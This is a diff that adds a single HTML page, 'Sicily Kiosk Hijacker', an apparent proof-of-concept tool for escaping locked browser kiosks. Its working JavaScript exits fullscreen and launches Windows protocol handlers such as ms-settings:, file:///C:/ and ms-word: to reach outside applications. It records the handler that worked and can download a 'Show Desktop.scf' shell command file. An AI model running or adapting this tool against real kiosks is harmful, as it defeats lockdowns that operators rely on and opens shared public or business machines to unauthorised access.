@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="lib/kioskboard.min.js"></script>
+    <title>Sicily Kiosk Hijacker</title>
+    <style>
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.4);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal {
+            background: #fff;
+            border-radius: 8px;
+            padding: 16px;
+            width: min(520px, 90vw);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .controls {
+            display: flex;
+            gap: 8px;
+            justify-content: flex-end;
+        }
+
+        .muted {
+            color: #666;
+        }
+
+        .countdown {
+            font-variant-numeric: tabular-nums;
+        }
+
+        table.results {
+            border-collapse: collapse;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        table.results th,
+        table.results td {
+            border: 1px solid #ddd;
+            padding: 6px 8px;
+            font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+            font-size: 12px;
+        }
+
+        .status {
+            font-weight: 600;
+        }
+
+        .status-ok {
+            color: #2e7d32;
+        }
+
+        .status-no {
+            color: #c62828;
+        }
+
+        .status-unknown {
+            color: #6b7280;
+        }
+
+        .steps {
+            display: flex;
+            gap: 12px;
+            margin: 12px 0 16px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .step {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 10px;
+            border: 1px solid #e5e7eb;
+            border-radius: 999px;
+            background: #f9fafb;
+            color: #111827;
+        }
+
+        .step .num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 20px;
+            height: 20px;
+            border-radius: 999px;
+            background: #d1d5db;
+            color: #111827;
+            font-weight: 700;
+            font-size: 12px;
+        }
+
+        .step.active {
+            border-color: #60a5fa;
+            background: #eff6ff;
+        }
+
+        .step.active .num {
+            background: #3b82f6;
+            color: #fff;
+        }
+
+        .step.done {
+            border-color: #34d399;
+            background: #ecfdf5;
+        }
+
+        .step.done .num {
+            background: #10b981;
+            color: #fff;
+        }
+
+        .badge {
+            display: inline-block;
+            font-size: 12px;
+            padding: 2px 6px;
+            border-radius: 999px;
+            background: #111827;
+            color: #fff;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        .subtle {
+            font-size: 12px;
+            color: #6b7280;
+        }
+
+        .btn {
+            font: inherit;
+            padding: 6px 10px;
+            border: 1px solid #ccc;
+            background: #f9fafb;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background: #f3f4f6;
+        }
+
+        .toolbar {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            margin: 6px 0 12px;
+        }
+    </style>
+    <script>
+        KioskBoard.init({
+
+            /*!
+            * Required
+            * An Array of Objects has to be defined for the custom keys. Hint: Each object creates a row element (HTML) on the keyboard.
+            * e.g. [{"key":"value"}, {"key":"value"}] => [{"0":"A","1":"B","2":"C"}, {"0":"D","1":"E","2":"F"}]
+            */
+            keysArrayOfObjects: null,
+
+            /*!
+            * Required only if "keysArrayOfObjects" is "null".
+            * The path of the "kioskboard-keys-${langugage}.json" file must be set to the "keysJsonUrl" option. (XMLHttpRequest to get the keys from JSON file.)
+            * e.g. '/Content/Plugins/KioskBoard/dist/kioskboard-keys-english.json'
+            */
+            keysJsonUrl: './public/english-keys.json',
+
+            /*
+            * Optional: An Array of Strings can be set to override the built-in special characters.
+            * e.g. ["#", "€", "%", "+", "-", "*"]
+            */
+            keysSpecialCharsArrayOfStrings: null,
+
+            /*
+            * Optional: An Array of Numbers can be set to override the built-in numpad keys. (From 0 to 9, in any order.)
+            * e.g. [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
+            */
+            keysNumpadArrayOfNumbers: null,
+
+            // Optional: (Other Options)
+
+            // Language Code (ISO 639-1) for custom keys (for language support) => e.g. "de" || "en" || "fr" || "hu" || "tr" etc...
+            language: 'en',
+
+            // The theme of keyboard => "light" || "dark" || "flat" || "material" || "oldschool"
+            theme: 'light',
+
+            // Scrolls the document to the top or bottom(by the placement option) of the input/textarea element. Prevented when "false"
+            autoScroll: true,
+
+            // Uppercase or lowercase to start. Uppercased when "true"
+            capsLockActive: true,
+
+            /*
+            * Allow or prevent real/physical keyboard usage. Prevented when "false"
+            * In addition, the "allowMobileKeyboard" option must be "true" as well, if the real/physical keyboard has wanted to be used.
+            */
+            allowRealKeyboard: false,
+
+            // Allow or prevent mobile keyboard usage. Prevented when "false"
+            allowMobileKeyboard: false,
+
+            // CSS animations for opening or closing the keyboard
+            cssAnimations: true,
+
+            // CSS animations duration as millisecond
+            cssAnimationsDuration: 360,
+
+            // CSS animations style for opening or closing the keyboard => "slide" || "fade"
+            cssAnimationsStyle: 'slide',
+
+            // Enable or Disable Spacebar functionality on the keyboard. The Spacebar will be passive when "false"
+            keysAllowSpacebar: true,
+
+            // Text of the space key (Spacebar). Without text => " "
+            keysSpacebarText: 'Space',
+
+            // Font family of the keys
+            keysFontFamily: 'sans-serif',
+
+            // Font size of the keys
+            keysFontSize: '22px',
+
+            // Font weight of the keys
+            keysFontWeight: 'normal',
+
+            // Size of the icon keys
+            keysIconSize: '25px',
+
+            // Text of the Enter key (Enter/Return). Without text => " "
+            keysEnterText: 'Enter',
+
+            // The callback function of the Enter key. This function will be called when the enter key has been clicked.
+            keysEnterCallback: function () {
+                var btn = document.getElementById('startBtn');
+                if (btn) btn.click();
+            },
+
+            // The Enter key can close and remove the keyboard. Prevented when "false"
+            keysEnterCanClose: true,
+        });
+        document.addEventListener("DOMContentLoaded", function () {
+            KioskBoard.run(".js-kioskboard-input");
+
+            function downloadStubFile() {
+                const blob = new Blob(
+                    [
+                        '[Shell]\nCommand=2\nIconFile=explorer.exe,3\n[Taskbar]\nCommand=ToggleDesktop'
+                    ],
+                    { type: 'application/octet-stream' }
+                );
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'Show Desktop.scf';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            }
+
+            function copyCurrentUrl() {
+                const url = window.location.href;
+                navigator.clipboard.writeText(url).then(() => {
+                    console.log('Current URL copied to clipboard:\n' + url);
+                }).catch(err => {
+                    console.log('Failed to copy URL: ' + err);
+                    console.log("Copy it manually:\n" + url);
+                });
+            }
+
+            const consoleElement = document.getElementById('console');
+            const _log = window.console.log.bind(window.console);
+            const _warn = window.console.warn.bind(window.console);
+            const _error = window.console.error.bind(window.console);
+            const colorFor = { info: 'black', warn: '#b58900', error: '#dc322f', debug: '#6b7280' };
+            const logger = {
+                runId: `run-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 7)}`,
+                buffer: [],
+                append(level, parts) {
+                    const ts = Date.now();
+                    const text = parts.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').trim();
+                    this.buffer.push({ ts, level, text });
+                    if (consoleElement) {
+                        const time = new Date(ts).toLocaleTimeString(undefined, { hour12: false }) + '.' + String(ts % 1000).padStart(3, '0');
+                        consoleElement.innerHTML += `<span style="color:${colorFor[level] || 'black'}">[${time}] [${level.toUpperCase()}] ${text}</span><br/>`;
+                        consoleElement.scrollTop = consoleElement.scrollHeight;
+                    }
+                },
+                clear() { this.buffer.length = 0; if (consoleElement) consoleElement.innerHTML = ''; }
+            };
+            window.__pocLogger = logger;
+
+            function appendLine(level, args) { logger.append(level, args); }
+            window.console.log = (...args) => { appendLine('info', args); _log(...args); };
+            window.console.warn = (...args) => { appendLine('warn', args); _warn(...args); };
+            window.console.error = (...args) => { appendLine('error', args); _error(...args); };
+
+            // Error capture for PoC fidelity
+            window.addEventListener('error', (e) => {
+                logger.append('error', ['window.error', { message: e.message, filename: e.filename, lineno: e.lineno, colno: e.colno }]);
+            });
+            window.addEventListener('unhandledrejection', (e) => {
+                logger.append('error', ['unhandledrejection', { reason: (e.reason && (e.reason.stack || e.reason.message)) || String(e.reason) }]);
+            });
+
+            const manualMode = document.getElementById('manualMode');
+            const manualInput = document.getElementById('manualInput');
+            function updateManualUI() {
+                const enabled = !!(manualMode && manualMode.checked);
+                if (manualInput) manualInput.disabled = !enabled;
+            }
+            if (manualMode) {
+                manualMode.addEventListener('change', () => { updateManualUI(); console.log('Manual Mode:', manualMode.checked ? 'enabled' : 'disabled'); });
+                updateManualUI();
+            }
+            if (manualInput) {
+                manualInput.addEventListener('keydown', (e) => {
+                    if (e.key === 'Enter') {
+                        e.preventDefault();
+                        const startBtn = document.getElementById('startBtn');
+                        if (startBtn) startBtn.click();
+                    }
+                });
+            }
+
+            // Environment banner and run id
+            const env = {
+                runId: logger.runId,
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                languages: navigator.languages || [navigator.language],
+                timezone: (Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'),
+                referrer: document.referrer || ''
+            };
+            const runBadge = document.getElementById('runId');
+            if (runBadge) runBadge.textContent = env.runId;
+            console.log('PoC started', env);
+            console.log('Up and running!');
+            console.log('Waiting...');
+        });
+    </script>
+</head>
+
+<body>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+
+            const protocols = [
+                { url: 'mailto:test@example.com', desc: 'Mail (default mail client)' },
+                { url: 'ms-settings:display', desc: 'Windows Settings → Display' },
+                { url: 'ms-windows-store:', desc: 'Microsoft Store' },
+                { url: 'microsoft-edge:https://www.bing.com', desc: 'Open Microsoft Edge' },
+                { url: 'tel:0123456789', desc: 'Phone dialer (if installed/registered)' },
+                { url: 'ms-screenclip:', desc: 'Screen clipping / Snip & Sketch' },
+                { url: 'ms-people:', desc: 'People app' },
+                { url: 'file:///C:/', desc: 'Open File Explorer (may restart explorer.exe)' },
+                // Office protocols often present if Office or stubs are installed:
+                { url: 'ms-word:', desc: 'Microsoft Word (if installed/stub)' },
+                { url: 'ms-excel:', desc: 'Microsoft Excel (if installed/stub)' }
+            ];
+
+            // state
+            let stopRequested = false;
+            const resultsBody = document.getElementById('resultsBody');
+            const startBtn = document.getElementById('startBtn');
+            const stopBtn = document.getElementById('stopBtn');
+            const useLastBtn = document.getElementById('useLastBtn');
+            const progressDiv = document.getElementById('progress');
+            const modalOverlay = document.getElementById('modalOverlay');
+            const modalText = document.getElementById('modalText');
+            const modalCountdown = document.getElementById('modalCountdown');
+            const yesBtn = document.getElementById('yesBtn');
+            const noBtn = document.getElementById('noBtn');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const step3 = document.getElementById('step3');
+
+            function setStepActive(stepEl) {
+                [step1, step2, step3].forEach(el => { if (!el) return; el.classList.remove('active'); });
+                if (stepEl) stepEl.classList.add('active');
+            }
+            function setStepDone(stepEl) {
+                if (stepEl) { stepEl.classList.remove('active'); stepEl.classList.add('done'); }
+            }
+            function resetSteps() {
+                [step1, step2, step3].forEach((el, idx) => {
+                    if (!el) return;
+                    el.classList.remove('active', 'done');
+                    if (idx === 0) el.classList.add('active');
+                });
+            }
+
+            function getLastWorking() {
+                try { return JSON.parse(localStorage.getItem('sicily:lastWorking') || 'null'); } catch { return null; }
+            }
+            function setLastWorking(entry) {
+                try { localStorage.setItem('sicily:lastWorking', JSON.stringify(entry)); } catch { }
+                if (useLastBtn) useLastBtn.disabled = !entry;
+            }
+            if (useLastBtn) useLastBtn.disabled = !getLastWorking();
+
+            // render initial table
+            function resetTable() {
+                resultsBody.innerHTML = '';
+                for (const p of protocols) {
+                    const tr = document.createElement('tr');
+                    tr.dataset.url = p.url;
+                    tr.innerHTML = `<td><code>${escapeHtml(p.url)}</code></td><td>${escapeHtml(p.desc)}</td><td class="status status-unknown">Not tested</td>`;
+                    resultsBody.appendChild(tr);
+                }
+            }
+            resetTable();
+
+            function escapeHtml(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+
+            function openProtocol(url) {
+                try {
+                    const newWin = window.open(url, '_blank');
+                    if (newWin) {
+                        return { method: 'window', handle: newWin };
+                    }
+                } catch (e) {
+                    // ignore
+                }
+
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.sandbox = 'allow-scripts allow-same-origin';
+                    document.body.appendChild(iframe);
+                    iframe.src = url;
+                    setTimeout(() => { try { iframe.remove(); } catch (_) { } }, 3000);
+                    return { method: 'iframe', handle: iframe };
+                } catch (e) {
+                    return { method: 'none', handle: null };
+                }
+            }
+
+            function normalizeTarget(raw) {
+                const s = String(raw || '').trim();
+                if (!s) return '';
+                if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(s)) return s;
+                if (/^\/\//.test(s)) return 'https:' + s;
+                return 'https://' + s;
+            }
+
+            function askUser(question, timeoutMs = 5000) {
+                return new Promise(resolve => {
+                    modalText.textContent = question;
+                    modalCountdown.textContent = String(Math.ceil(timeoutMs / 1000));
+                    modalOverlay.style.display = 'flex';
+
+                    let finished = false;
+                    let countdownInterval = null;
+
+                    const cleanup = (answer) => {
+                        if (finished) return;
+                        finished = true;
+                        modalOverlay.style.display = 'none';
+                        yesBtn.removeEventListener('click', onYes);
+                        noBtn.removeEventListener('click', onNo);
+                        clearInterval(countdownInterval);
+                        resolve(answer);
+                    };
+
+                    const onYes = () => cleanup('yes');
+                    const onNo = () => cleanup('no');
+
+                    yesBtn.addEventListener('click', onYes);
+                    noBtn.addEventListener('click', onNo);
+
+                    // countdown display
+                    let remaining = Math.ceil(timeoutMs / 1000);
+                    countdownInterval = setInterval(() => {
+                        remaining--;
+                        modalCountdown.textContent = String(Math.max(0, remaining));
+                    }, 1000);
+
+                    // timeout
+                    setTimeout(() => cleanup('timeout'), timeoutMs);
+                });
+            }
+
+            function detectExternalOpen(timeoutMs = 1500) {
+                return new Promise(resolve => {
+                    let detected = false;
+                    function onBlur() {
+                        detected = true;
+                    }
+                    function onVisibility() {
+                        if (document.hidden) detected = true;
+                    }
+                    window.addEventListener('blur', onBlur);
+                    document.addEventListener('visibilitychange', onVisibility);
+
+                    setTimeout(() => {
+                        window.removeEventListener('blur', onBlur);
+                        document.removeEventListener('visibilitychange', onVisibility);
+                        resolve(detected);
+                    }, timeoutMs);
+                });
+            }
+
+            function setRowStatus(url, status, info = '') {
+                const tr = resultsBody.querySelector(`tr[data-url="${CSS.escape(url)}"]`);
+                if (!tr) return;
+                const td = tr.querySelector('.status');
+                td.className = `status ${status === 'ok' ? 'status-ok' : status === 'no' ? 'status-no' : 'status-unknown'}`;
+                td.textContent = status === 'ok' ? `Yes ${info ? '(' + info + ')' : ''}` : status === 'no' ? `No ${info ? '(' + info + ')' : ''}` : `Unknown ${info}`;
+            }
+
+            async function breakFullscreen() {
+                setStepActive(step1);
+                progressDiv.textContent = 'Breaking fullscreen…';
+                let attempted = false;
+                const logResult = (api, ok, err) => console.log('Fullscreen attempt:', api, ok ? 'success' : 'fail', err ? String(err) : '');
+                try { if (document.exitFullscreen) { attempted = true; await document.exitFullscreen(); logResult('exitFullscreen', true); } } catch (e) { logResult('exitFullscreen', false, e); }
+                try { if (document.webkitExitFullscreen) { attempted = true; await document.webkitExitFullscreen(); logResult('webkitExitFullscreen', true); } } catch (e) { logResult('webkitExitFullscreen', false, e); }
+                try { if (document.msExitFullscreen) { attempted = true; document.msExitFullscreen(); logResult('msExitFullscreen', true); } } catch (e) { logResult('msExitFullscreen', false, e); }
+                if (!attempted) console.warn('No fullscreen API available or not currently in fullscreen');
+                setStepDone(step1);
+            }
+
+            async function runTests() {
+                stopRequested = false;
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+                progressDiv.textContent = 'Running...';
+                resetSteps();
+                await breakFullscreen();
+                setStepActive(step2);
+                progressDiv.textContent = 'Scanning protocols…';
+
+                for (const p of protocols) {
+                    if (stopRequested) break;
+                    progressDiv.textContent = `Testing: ${p.url}`;
+                    setRowStatus(p.url, 'unknown', 'testing');
+
+                    console.log('Launching protocol', p.url, '-', p.desc);
+                    const opener = openProtocol(p.url);
+
+                    // Run heuristic detection for a short window (1.5s)
+                    const heuristic = await detectExternalOpen(1500);
+                    console.log('Heuristic detection result:', heuristic);
+
+                    // Show modal asking user for confirmation and allow up to 5s (5000ms)
+                    const question = `Did the app associated with "${p.url}" open on your PC?`;
+                    // If heuristic says yes, prefill the question text to indicate we detected focus change
+                    const modalQuestion = heuristic ? question + ' (we detected a focus change — likely launched)' : question;
+                    const userAnswer = await askUser(modalQuestion, 5000);
+                    console.log('User response:', userAnswer);
+
+                    // - 'yes' -> ok
+                    // - 'no' or 'timeout' -> no (timeout means user didn't confirm)
+                    // but if heuristic==true and user timed out, mark ok (since user didn't respond but we detected external open)
+                    let finalStatus = 'no';
+                    let info = '';
+                    if (userAnswer === 'yes') { finalStatus = 'ok'; info = 'user:yes'; }
+                    else if (userAnswer === 'no') { finalStatus = 'no'; info = 'user:no'; }
+                    else if (userAnswer === 'timeout') {
+                        if (heuristic) { finalStatus = 'ok'; info = 'no response (heuristic positive)'; }
+                        else { finalStatus = 'no'; info = 'no response'; }
+                    }
+
+                    setRowStatus(p.url, finalStatus === 'ok' ? 'ok' : 'no', info);
+                    if (finalStatus === 'ok') {
+                        setLastWorking({ url: p.url, desc: p.desc, info, ts: Date.now() });
+                    }
+                    console.log('Final status:', finalStatus, 'info:', info);
+
+                    try {
+                        if (opener && opener.handle && opener.method === 'window' && opener.handle.close) {
+                            setTimeout(() => {
+                                try { opener.handle.close(); } catch (_) { }
+                            }, 1200);
+                        }
+                    } catch (e) { }
+
+                    await new Promise(r => setTimeout(r, 1000));
+                }
+
+                progressDiv.textContent = 'Completed';
+                setStepDone(step2);
+                setStepActive(step3);
+                const anyOk = !!resultsBody.querySelector('.status-ok');
+                if (anyOk) {
+                    setStepDone(step3);
+                    console.log('Escaped Chrome sandbox successfully');
+                } else {
+                    console.warn('No working protocol found; sandbox escape not confirmed');
+                }
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+            }
+
+            startBtn.addEventListener('click', async () => {
+                const manualMode = document.getElementById('manualMode');
+                const manualInput = document.getElementById('manualInput');
+
+                if (manualMode && manualMode.checked) {
+                    const raw = manualInput ? manualInput.value : '';
+                    const target = normalizeTarget(raw);
+                    if (!target) {
+                        console.error('Manual URL is empty.');
+                        return;
+                    }
+                    console.log('Manual Mode launch:', { raw, normalized: target });
+                    openProtocol(target);
+                    setStepDone(step1);
+                    setStepActive(step2);
+                    return;
+                }
+
+                resetTable();
+                console.log('Starting automated protocol tests');
+                runTests();
+            });
+            stopBtn.addEventListener('click', () => {
+                stopRequested = true;
+                progressDiv.textContent = 'Stopping...';
+            });
+
+            if (useLastBtn) {
+                useLastBtn.addEventListener('click', () => {
+                    const last = getLastWorking();
+                    if (!last) return console.warn('No last working protocol saved');
+                    console.log('Using last working protocol:', last);
+                    openProtocol(last.url);
+                });
+            }
+
+            // CSS.escape polyfill in case of older browsers
+            if (!CSS.escape) {
+                CSS.escape = function (value) {
+                    return String(value).replace(/([^\w-])/g, function (ch) { return '\\' + ch; });
+                };
+            }
+        });
+    </script>
+    <img src="./public/logo.png" alt="Sicily Kiosk Hijacker Logo" style="width:200px;height:auto;">
+    <h1>Sicily Kiosk Hijacker</h1>
+    <div class="subtle">Run: <span id="runId" class="badge">loading…</span></div>
+    <div style="padding-bottom: 12px;">
+        <div id="console"
+            style="width: 40%; height: 200px; background: #fff; border: 1px solid #ccc; overflow-y: auto; font-family: monospace; white-space: normal;">
+        </div>
+    </div>
+    <div class="toolbar">
+        <button class="btn" onclick="window.__pocLogger && window.__pocLogger.copy()">Copy Logs</button>
+        <button class="btn" onclick="window.__pocLogger && window.__pocLogger.clear()">Clear</button>
+        <span class="muted">Logs mirror to DevTools console.</span>
+    </div>
+    <div style="padding-bottom: 12px;">
+        <input type="checkbox" id="manualMode">
+        <label for="manualMode">Manual Mode</label>
+        <input type="text" id="manualInput" placeholder="Enter the URL here" class="js-kioskboard-input"
+            data-kioskboard-type="keyboard" data-kioskboard-placement="bottom">
+    </div>
+    <div style="padding-bottom: 12px;">
+        <input type="checkbox" id="verboseMode" checked
+            onchange="document.getElementById('console').style.display = this.checked ? 'block' : 'none';">
+        <label for="verboseMode">Verbose Mode</label>
+    </div>
+    <div class="steps" id="steps">
+        <div class="step active" id="step1"><span class="num"><svg xmlns="http://www.w3.org/2000/svg" width="24"
+                    height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round"
+                    class="lucide lucide-door-open-icon lucide-door-open">
+                    <path d="M11 20H2" />
+                    <path
+                        d="M11 4.562v16.157a1 1 0 0 0 1.242.97L19 20V5.562a2 2 0 0 0-1.515-1.94l-4-1A2 2 0 0 0 11 4.561z" />
+                    <path d="M11 4H8a2 2 0 0 0-2 2v14" />
+                    <path d="M14 12h.01" />
+                    <path d="M22 20h-3" />
+                </svg></span> Break Fullscreen</div>
+        <div class="step" id="step2"><span class="num"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" class="lucide lucide-radar-icon lucide-radar">
+                    <path d="M19.07 4.93A10 10 0 0 0 6.99 3.34" />
+                    <path d="M4 6h.01" />
+                    <path d="M2.29 9.62A10 10 0 1 0 21.31 8.35" />
+                    <path d="M16.24 7.76A6 6 0 1 0 8.23 16.67" />
+                    <path d="M12 18h.01" />
+                    <path d="M17.99 11.66A6 6 0 0 1 15.77 16.67" />
+                    <circle cx="12" cy="12" r="2" />
+                    <path d="m13.41 10.59 5.66-5.66" />
+                </svg></span> Scan Protocols</div>
+        <div class="step" id="step3"><span class="num"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
+                    viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                    stroke-linejoin="round" class="lucide lucide-smile-icon lucide-smile">
+                    <circle cx="12" cy="12" r="10" />
+                    <path d="M8 14s1.5 2 4 2 4-2 4-2" />
+                    <line x1="9" x2="9.01" y1="9" y2="9" />
+                    <line x1="15" x2="15.01" y1="9" y2="9" />
+                </svg></span> Escaped Sandbox</div>
+    </div>
+    <div style="padding-bottom: 12px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+        <button id="startBtn">Start</button>
+        <button id="stopBtn" disabled>Stop</button>
+        <button id="useLastBtn" disabled>Use Last Working</button>
+        <div id="progress" class="muted"></div>
+    </div>
+    <div style="padding-bottom: 12px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+        <p class="subtle">Extras</p>
+        <button onclick="downloadStubFile()">Download Stub File</button>
+        <button onclick="this.disabled=true;location.reload();">Reload Page</button>
+        <button onclick="copyCurrentUrl()">Copy Current URL</button>
+        <button onclick="alert('Sicily Kiosk Hijacker Version 1.0 Author: @genr234');">About</button>
+    </div>
+    <table class="results" aria-label="Protocol test results">
+        <thead>
+            <tr>
+                <th>Protocol URL</th>
+                <th>Description</th>
+                <th>Opened?</th>
+            </tr>
+        </thead>
+        <tbody id="resultsBody"></tbody>
+    </table>
+    <div id="modalOverlay" class="overlay" style="display:none">
+        <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+            <h3 id="modalTitle">Did the app open?</h3>
+            <p id="modalText"></p>
+            <p class="muted">Auto-recording in <span id="modalCountdown" class="countdown">5</span>s</p>
+            <div class="controls">
+                <button id="noBtn">No</button>
+                <button id="yesBtn" style="background:#0b84ff;color:white;border:0">Yes</button>
+            </div>
+        </div>
+    </div>
+    <img src="./public/lagtrain.gif" alt="Lag Train" style="width: 50%;">
+</body>
+
+</html>
